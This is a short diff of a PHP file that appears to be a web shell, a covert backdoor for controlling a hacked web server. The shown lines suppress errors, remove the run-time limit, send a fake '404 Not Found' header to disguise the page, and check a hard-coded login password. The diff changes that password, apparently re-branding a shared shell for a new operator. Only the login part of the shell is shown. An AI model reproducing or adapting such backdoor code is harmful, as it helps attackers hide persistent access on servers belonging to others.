@@ -8,7 +8,7 @@ set_time_limit(0);
 error_reporting(0);
 header('HTTP/1.0 404 Not Found', true, 404);
 session_start();
-$pass = "J4CKGanzz";
+$pass = "mex137";
 $link = "fvck.txt";
 if($_POST['password'] == $pass) {
 	$_SESSION['forbidden'] = $pass;
